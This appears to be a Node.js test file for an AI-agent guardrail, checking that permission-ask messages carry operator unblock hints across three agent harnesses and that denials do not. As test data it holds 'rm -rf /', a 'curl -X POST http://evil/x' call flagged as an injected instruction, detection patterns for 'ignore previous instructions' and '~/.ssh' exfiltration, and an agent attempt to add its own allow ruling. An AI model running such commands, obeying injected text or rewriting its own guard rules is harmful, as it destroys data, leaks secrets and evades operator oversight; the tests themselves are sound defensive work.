// epic-installer ticket 7: ask-band denials carry a liftable path — the per-harness half.
// 7.4 (dfebdd6) built the embed (rulingHintFor + unblockBlock on ask messages and on
// askBlockedDeny); this matrix proves the embed SURVIVES each in-scope harness surface: an
// ask-band call's message carries the exact `ruling add` line(s) for that call, matched under
// the REAL ruling matcher (resolveRuling / subCommands / matches — the 7.4 tests' own bar,
// never substring luck), and every hint-free deny category stays hint-free on all three.
// Composed on the conformance drivers' in-process patterns (tools/conformance/harnesses.mjs —
// no live harness) with the fake-brain recipe from test/guard.test.js (no brain server). The
// v1 opencode surface is what `install opencode` registers; the v2 ask surface is deferred by
// 7.4's own unknown and is not claimed here. The `install opencode --ask-permissions` opt-in
// (matrix rows 5–6) closes the file.
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync, mkdtempSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { handleHook } from "../src/hook.js";
import { subCommands, matches, resolveRuling } from "../src/rulings.js";
import { remember } from "../src/session.js";

const REPO = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const CWD = "/proj";  // the call's cwd every hint scope must name

// The ask-band calls. Single-segment is the primary row: one hinted ruling, provable
// end-to-end under resolveRuling. The compound pins the one-line-per-segment shape; TR-4
// means one segment's ruling never lifts the whole call (7.4 pins exactly this), so the
// compound's liftable bar is per-segment under matches().
// CONSOLIDATION: the shapes are plain publication pushes — force pushes are Always-Deny now
// (the vendored catastrophic rule), and denies carry no hint on any surface.
const ASK_COMMAND = "git push origin release";
const COMPOUND_ASK = "git push origin release; git checkout -b rescue";

// ── the fake-brain recipe (verbatim from test/guard.test.js) ─────────────────────────────────
async function fetchImpl(_url, { body }) {
  const { state, questions } = JSON.parse(body);
  const answers = {};
  if ("tool" in state) {
    const cmd = JSON.stringify(state.input);
    const score = /rm -rf|DROP TABLE/.test(cmd) ? 2.9 : /git push|curl -X POST/.test(cmd) ? 2.0 : 0.2;
    answers.risk = { type: "score", score, probabilities: { 3: score / 3 }, legend: {}, confidence: 0.8 };
    answers.approval = { type: "noul", noul: score >= 2 ? 0.85 : 0.05 };
    const ctx = state.context ?? {};
    answers.user_requested = { type: "noul", noul: (ctx.user_recent_messages ?? []).some((m) => cmd.includes(m)) ? 0.95 : 0.05 };
    answers.from_untrusted = { type: "noul", noul: ctx.flagged_untrusted_content?.length && /curl/.test(cmd) ? 0.9 : 0.05 };
    answers.leaks_secrets = { type: "noul", noul: 0.05 };
    answers.dumps_env_argv = { type: "noul", noul: 0.05 };
    answers.dumps_process_argv = { type: "noul", noul: 0.05 };
    answers.reads_credential_file = { type: "noul", noul: 0.05 };
  } else if ("malicious" in questions) {
    const bad = /send ~\/\.ssh|do not tell the user/i.test(state.content);
    answers.malicious = { type: "noul", noul: bad ? 0.92 : 0.04 };
    answers.kind = { type: "choice", choice: bad ? "exfiltration" : "clean", probabilities: {}, confidence: 0.9 };
  } else {
    const c = state.content;
    const kind = /ignore previous instructions/i.test(c) ? "injection" : /I am an AI/.test(c) ? "canary" : /prompt injection/i.test(c) ? "discussion" : "benign";
    answers.directed = { type: "noul", noul: kind === "benign" ? 0.02 : 0.93 };
    answers.kind = { type: "choice", choice: kind, probabilities: { [kind]: 0.9 }, confidence: 0.9 };
  }
  return { ok: true, json: async () => ({ model: "fake", answers, usage: {} }) };
}

// The M8 leaky-brain shape (the 7.4 "Credential Exposure" row): a near-certain leak answer on
// an otherwise-harmless call.
const leakyBrain = async () => ({ ok: true, json: async () => ({ answers: {
  risk: { type: "score", score: 0.2, probabilities: {}, confidence: 0.8 },
  approval: { type: "noul", noul: 0.05 }, user_requested: { type: "noul", noul: 0.05 }, from_untrusted: { type: "noul", noul: 0.05 },
  leaks_secrets: { type: "noul", noul: 0.95 }, dumps_env_argv: { type: "noul", noul: 0.05 },
  dumps_process_argv: { type: "noul", noul: 0.05 }, reads_credential_file: { type: "noul", noul: 0.05 },
} }) });

// ── environment: pi, the OpenCode plugin and remember() configure the core from process.env +
// global fetch (the conformance harnesses patch the same pair); the patch is restored no
// matter how the body ends.
const guardEnv = (home) => ({ JEV_API_KEY: "test", GUARD_HOME: home, GUARD_SESSIONS: join(home, "sessions") });
const freshHome = () => mkdtempSync(join(tmpdir(), "ug-ask-surface-"));

async function withDriverEnv({ home, brain = fetchImpl }, fn) {
  const env = guardEnv(home);
  const saved = Object.fromEntries(Object.keys(env).map((k) => [k, process.env[k]]));
  const realFetch = globalThis.fetch;
  Object.assign(process.env, env);
  globalThis.fetch = brain;
  try { return await fn(env); }
  finally {
    globalThis.fetch = realFetch;
    for (const [k, v] of Object.entries(saved)) { if (v === undefined) delete process.env[k]; else process.env[k] = v; }
  }
}

// ── the three driver surfaces (conformance patterns, in-process) ──────────────────────────────

// Surface 1: src/hook.js — the claude hook driver (the conformance `claude` dialect).
async function claudeHook(command, { home, sid, brain = fetchImpl }) {
  const out = await handleHook(
    { hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command }, session_id: sid, cwd: CWD },
    { env: guardEnv(home), fetchImpl: brain });
  return {
    verdict: out?.hookSpecificOutput?.permissionDecision ?? "allow",
    text: out?.hookSpecificOutput?.permissionDecisionReason ?? "",
  };
}

// Surface 2: src/opencode.js — the v1 surface (the adapter `install opencode` registers). Both
// deny and ask block by THROWING; the thrown message is the surface's carrier.
async function opencodeBefore(command, { sid }) {
  const { UnjangledGuardrails } = await import("../src/opencode.js");
  const hooks = await UnjangledGuardrails({ client: {}, directory: CWD });
  let err = null;
  try { await hooks["tool.execute.before"]({ tool: "Bash", sessionID: sid }, { args: { command } }); }
  catch (e) { err = e; }
  return { thrown: !!err, text: err?.message ?? "" };
}

// Surface 3: extensions/unjangled-guardrails.ts — the pi extension. hasUI=false drives the
// ask→block conversion named in the matrix; hasUI=true captures the confirm-dialog body the
// real UI renders (the other pi message shape).
async function piCall(command, { sid, hasUI = false }) {
  const { default: piExtension } = await import(new URL("../extensions/unjangled-guardrails.ts", import.meta.url));
  const handlers = {};
  piExtension({ on: (name, fn) => { handlers[name] = fn; } });
  const confirmBodies = [];
  const ctx = {
    sessionManager: { getSessionId: () => sid, getBranch: () => [] },
    cwd: CWD, sessionID: sid, signal: undefined, hasUI,
    ui: { notify: () => {}, confirm: async (_title, body) => { confirmBodies.push(body); return true; } },
  };
  const r = await handlers.tool_call({ toolName: "Bash", input: { command } }, ctx);
  return { r, confirmBodies };
}

// ── hint extraction + the real-matcher bar ────────────────────────────────────────────────────

// 7.4's unblock block (guard.js keeps it private; the 7.4 tests pin the same string).
const UNBLOCK_MARKER = "Operator unblock (run in your own terminal, not here — the gate blocks agent-run ruling changes):\n";
// CAP-7's line shape: the store prefix, the install's real node entry, the current `policy
// add` spelling, the generalized pattern, the resolved scope. A harness may append its own
// text to the surfaced copy, so the line match tolerates a trailing suffix; exactness is
// pinned by the pattern/scope/matcher asserts, not by requiring isolated lines. The trailing
// `# policy store:` comment line matches neither this nor any hint assertion.
const HINT_LINE = /^GUARD_HOME='(.*)' node '(.*)' policy add --effect allow --pattern '(.*)' --scope 'project:(.*)' --reason 'operator unblock'(?: .*)?$/;

function hintMatches(text) {
  const i = String(text).indexOf(UNBLOCK_MARKER);
  if (i < 0) return [];
  return String(text).slice(i + UNBLOCK_MARKER.length).split("\n")
    .map((l) => l.match(HINT_LINE)).filter(Boolean);
}

// The matrix's failure duty: name the missing hint. Every assert below quotes the surfaced text.
function assertHintLifts(text, { command, cwd, env }) {
  const found = hintMatches(text);
  assert.ok(found.length > 0, `no liftable hint found in the surfaced message: ${JSON.stringify(text)}`);
  const segs = subCommands({ command }, "Bash");  // the matcher's own split — the lines must agree with it
  assert.equal(found.length, segs.length, `expected one hint line per matcher segment (${segs.length}) in: ${JSON.stringify(text)}`);
  const rulings = found.map((m, i) => {
    assert.equal(m[4], cwd, `hint line ${i} scope must name the call's cwd (got project:${m[4]}, want project:${cwd})`);
    // CAP-7: the pattern is generalized — verb + subcommand + flag run pinned, the variable
    // tail wildcarded — never the full literal, and it must still match its own matcher
    // segment (the wildcard only appears when a tail exists to match it), so the minted
    // entry re-covers the very call that asked
    if (segs[i].split(/\s+/).length > 2)
      assert.notEqual(m[3], segs[i], `hint line ${i} pattern must be generalized, not the literal segment: ${segs[i]}`);
    assert.equal(matches({ effect: "allow", pattern: m[3], scope: `project:${m[4]}` }, { tool: "Bash", preview: [segs[i]], cwd }), true,
      `hint line ${i} pattern must match its own matcher segment (pattern ${m[3]}, segment ${segs[i]})`);
    return { id: "ask-surface-hint", effect: "allow", pattern: m[3], scope: `project:${m[4]}`, expiresAt: new Date(Date.now() + 864e5).toISOString() };
  });
  if (segs.length === 1) {
    // The end-to-end bar: the hinted pattern+scope, written as a ruling into a throwaway
    // store, lifts THAT call under resolveRuling — the real matcher, not a re-derivation.
    writeRulingStore(env, rulings);
    const lifted = resolveRuling("ask", { tool: "Bash", input: { command }, cwd, env });
    assert.ok(lifted, `the hinted ruling must lift the ask under resolveRuling (command: ${command})`);
    assert.equal(lifted.pattern, found[0][3]);
  } else {
    // Compound: TR-4 — every sub-command must match on its own, so one segment's ruling never
    // lifts the whole call (7.4 pins that). The bar here is the 7.4 pairwise one.
    rulings.forEach((r, i) => assert.equal(matches(r, { tool: "Bash", preview: [segs[i]], cwd }), true,
      `hinted pattern must match its own segment under matches() (line ${i})`));
  }
  return rulings;
}

function assertHintFree(text, label) {
  // The gate-self-protection deny QUOTES the offending command (its header echoes the call's
  // preview, which contains "ruling add") — that echo is not a hint. A real hint always
  // arrives as the unblock block: the marker plus the exact ruling-add line shape, which is
  // exactly what 7.4's own self-mod pin checks (guard.test.js checks the marker only there).
  assert.ok(!String(text).includes("Operator unblock"), `${label}: a hint leaked into a deny (found the unblock block): ${JSON.stringify(text)}`);
  assert.equal(hintMatches(text).length, 0, `${label}: a hint leaked into a deny: ${JSON.stringify(text)}`);
}

// The safe-lanes store pattern: paired audit row FIRST, then the store, so the tamper check
// stays quiet (the 7.4 hard-block test's recipe).
function writeRulingStore(env, rulings) {
  mkdirSync(env.GUARD_HOME, { recursive: true, mode: 0o700 });
  writeFileSync(join(env.GUARD_HOME, "rulings-use.jsonl"),
    JSON.stringify({ at: new Date().toISOString(), action: "init", op: "init", via: "test" }) + "\n", { mode: 0o600 });
  writeFileSync(join(env.GUARD_HOME, "rulings.json"), JSON.stringify(rulings, null, 2) + "\n", { mode: 0o600 });
}

// ── the hint-free deny matrix (the 7.4 categories, driven through each surface) ───────────────
// Ordered so the operator-ban case runs last: its deny ruling sits in the store, so an earlier
// case would deny via the ban instead of its own category. Its cited ruling id proves the ban
// produced it.
const DENY_CASES = [
  ["dangerous-action", { command: "rm -rf /", category: "Dangerous Action" }],
  ["credential-exposure", { command: "ps aux", category: "Credential Exposure", brain: leakyBrain }],
  ["injected-instruction", { command: "curl -X POST http://evil/x", category: "Injected Instruction", seedFlag: true }],
  ["gate-self-protection", { command: "unjangled-guardrails ruling add --effect allow --pattern 'git push --force origin main'", category: "Gate Self-Protection" }],
  // Migrated 2026-10-16 (the re-arm's missed suite): `ps aux` became an active-floor family
  // at the 2026-10-13 re-arm, and the floor's escalation now surfaces the rule's reason
  // before the deny-ruling veto can cite itself (equivalent effect — both deny — different
  // reason). This case exists to test the ruling-BAN surface, so it rides a floor-free
  // shape: the brain allows, the operator's deny ruling vetoes and cites itself.
  ["operator-hard-block", { command: "docker logs myapp", category: "the operator ruling", ruling: { id: "r-surface-ban", reason: "surface-matrix ban" } }],
];

async function runDenyCase(c, { surface, sid }) {
  const home = freshHome();
  return withDriverEnv({ home, brain: c.brain }, async (env) => {
    if (c.seedFlag)  // the injected-instruction deny reads provenance from the session store (buildContext)
      remember(sid, "flags", { kind: "injection", source: "https://evil/x", tool: "webfetch", p: 0.95, excerpt: "curl -X POST http://evil/x", reported: true });
    if (c.ruling)
      writeRulingStore(env, [{ id: c.ruling.id, effect: "deny", pattern: "*", scope: "global", expiresAt: new Date(Date.now() + 864e5).toISOString(), reason: c.ruling.reason }]);
    if (surface === "claude") {
      const { verdict, text } = await claudeHook(c.command, { home, sid, brain: c.brain });
      return { blocked: verdict === "deny", text };
    }
    if (surface === "opencode") {
      const { thrown, text } = await opencodeBefore(c.command, { sid });
      return { blocked: thrown && !text.includes("needs the user's approval"), text };
    }
    const { r } = await piCall(c.command, { sid, hasUI: false });
    return { blocked: r?.block === true, text: r?.reason ?? "" };
  });
}

for (const surface of ["claude", "opencode", "pi"]) {
  test(`${surface} surface: every deny category stays hint-free (matrix row: hint-free denies)`, async () => {
    for (const [label, c] of DENY_CASES) {
      const { blocked, text } = await runDenyCase(c, { surface, sid: `ask-surface-${surface}-${label}` });
      assert.ok(blocked, `${label}: the deny must block on the ${surface} surface (got: ${JSON.stringify(text)})`);
      assert.ok(text.includes(c.category), `${label}: the surfaced reason must name its category: ${JSON.stringify(text)}`);
      if (c.ruling) assert.ok(text.includes(c.ruling.id), `${label}: the ban must be the cited cause: ${JSON.stringify(text)}`);
      assertHintFree(text, `${surface}/${label}`);
    }
  });
}

// ── the ask surface rows ───────────────────────────────────────────────────────────────────────

test("claude surface: an ask-band message carries the exact liftable hint (single + compound)", async () => {
  const home = freshHome();
  await withDriverEnv({ home }, async (env) => {
    const single = await claudeHook(ASK_COMMAND, { home, sid: "ask-surface-claude" });
    assert.equal(single.verdict, "ask", `the call must land on the ask band: ${JSON.stringify(single)}`);
    assertHintLifts(single.text, { command: ASK_COMMAND, cwd: CWD, env });

    const compound = await claudeHook(COMPOUND_ASK, { home, sid: "ask-surface-claude-compound" });
    assert.equal(compound.verdict, "ask", `the compound must land on the ask band: ${JSON.stringify(compound)}`);
    assertHintLifts(compound.text, { command: COMPOUND_ASK, cwd: CWD, env });
  });
});

test("opencode surface (v1, the adapter install opencode registers): the thrown ask message carries the exact liftable hint", async () => {
  const home = freshHome();
  await withDriverEnv({ home }, async (env) => {
    const single = await opencodeBefore(ASK_COMMAND, { sid: "ask-surface-oc" });
    assert.ok(single.thrown, "an ask blocks by throwing — the conversation loop is the prompt");
    assert.match(single.text, /needs the user's approval/, `the thrown message must be the ask band: ${JSON.stringify(single.text)}`);
    assertHintLifts(single.text, { command: ASK_COMMAND, cwd: CWD, env });

    const compound = await opencodeBefore(COMPOUND_ASK, { sid: "ask-surface-oc-compound" });
    assert.ok(compound.thrown && compound.text.includes("needs the user's approval"));
    assertHintLifts(compound.text, { command: COMPOUND_ASK, cwd: CWD, env });
  });
});

test("pi surface: the ask→block conversion and the confirm dialog carry the exact liftable hint", async () => {
  // the conversion the matrix names: no prompt surface → the ask blocks, hint riding the reason
  const home = freshHome();
  await withDriverEnv({ home }, async (env) => {
    const conversion = await piCall(ASK_COMMAND, { sid: "ask-surface-pi-noui", hasUI: false });
    assert.equal(conversion.r?.block, true, `the no-UI ask must convert to a block: ${JSON.stringify(conversion.r)}`);
    assert.match(conversion.r.reason, /no UI to ask for approval/);
    assertHintLifts(conversion.r.reason, { command: ASK_COMMAND, cwd: CWD, env });

    const compound = await piCall(COMPOUND_ASK, { sid: "ask-surface-pi-compound", hasUI: false });
    assertHintLifts(compound.r.reason, { command: COMPOUND_ASK, cwd: CWD, env });
  });
  // the other pi message shape: with a UI the same decision renders in the confirm dialog.
  // Fresh store on purpose: the liftable-proof above WROTE the hinted ruling, and a same-store
  // rerun of the same command would be lifted by it — the proof working is not the pi shape.
  const dialogHome = freshHome();
  await withDriverEnv({ home: dialogHome }, async () => {
    const dialog = await piCall(ASK_COMMAND, { sid: "ask-surface-pi-ui", hasUI: true });
    assert.equal(dialog.r, undefined, "an approved ask passes");
    assert.equal(dialog.confirmBodies.length, 1, `the confirm dialog must have fired: ${JSON.stringify(dialog)}`);
    assert.ok(hintMatches(dialog.confirmBodies[0]).length > 0,
      `the confirm dialog body must carry the hint: ${JSON.stringify(dialog.confirmBodies[0])}`);
  });
});

// ── the opencode opt-in (matrix rows 5–6) ─────────────────────────────────────────────────────

test("install opencode: silent on permission-ask by default; --ask-permissions prints the snippet AND the tradeoff", () => {
  const home = mkdtempSync(join(tmpdir(), "ug-ask-surface-install-"));
  const run = (args) => execFileSync(process.execPath, ["src/cli.js", "install", "opencode", ...args],
    { encoding: "utf8", cwd: REPO, env: { ...process.env, HOME: home } });
  const plain = run(["--home", home]);
  assert.ok(!/permission/i.test(plain) && !plain.includes('"bash"') && !plain.includes("approval prompts"),
    `plain install opencode must carry no permission-ask recommendation: ${JSON.stringify(plain)}`);
  const opted = run(["--ask-permissions", "--home", home]);
  assert.ok(opted.includes('{\n  "permission": { "bash": "ask" }\n}'),
    `the exact opencode.json snippet must print: ${JSON.stringify(opted)}`);
  const snippetAt = opted.indexOf('"permission"');
  const tradeoffAt = opted.indexOf("EVERY bash call, not just the ones unjangled-guardrails flags");
  assert.ok(tradeoffAt > -1, `the tradeoff must print with the feature: ${JSON.stringify(opted)}`);
  assert.ok(tradeoffAt > snippetAt, "the tradeoff rides the same print, in the same breath as the feature");
  // surface-honest: the default (v1) print claims only the tradeoff — the auto-approve half
  // exists only on --v2's permission.evaluate, so it rides that print alone.
  assert.ok(!opted.includes("auto-approves"),
    `the v1-default print must not claim an auto-approve the v1 adapter cannot do: ${JSON.stringify(opted)}`);
  const optedV2 = execFileSync(process.execPath, ["src/cli.js", "install", "opencode", "--v2", "--ask-permissions", "--home", mkdtempSync(join(tmpdir(), "ug-ask-surface-install-v2-"))],
    { encoding: "utf8", cwd: REPO, env: { ...process.env, HOME: home } });
  assert.ok(optedV2.includes("The v2 adapter auto-approves the safe ones"),
    `the --v2 print must carry the auto-approve half: ${JSON.stringify(optedV2)}`);
  // nothing was auto-applied: the installer only ever prints — opt-in means the operator runs it
  assert.equal(existsSync(join(home, "opencode.json")), false, "no opencode.json may be written by the installer");
  assert.ok(!readFileSync(join(home, ".config", "opencode", "plugins", "unjangled-guardrails.js"), "utf8").includes("permission"),
    "the adapter itself carries no permission config");
});

test("install --ask-permissions applies only to opencode", () => {
  const home = mkdtempSync(join(tmpdir(), "ug-ask-surface-install2-"));
  let out = "";
  try {
    execFileSync(process.execPath, ["src/cli.js", "install", "claude", "--ask-permissions", "--home", home],
      { encoding: "utf8", cwd: REPO, env: { ...process.env, HOME: home } });
    assert.fail("the off-target opt-in must exit nonzero");
  } catch (e) {
    out = `${e.stderr ?? ""}${e.stdout ?? ""}`;
    assert.equal(e.status, 1, `expected exit 1, got ${e.status}: ${out.slice(0, 400)}`);
  }
  assert.match(out, /--ask-permissions applies only to opencode/);
});
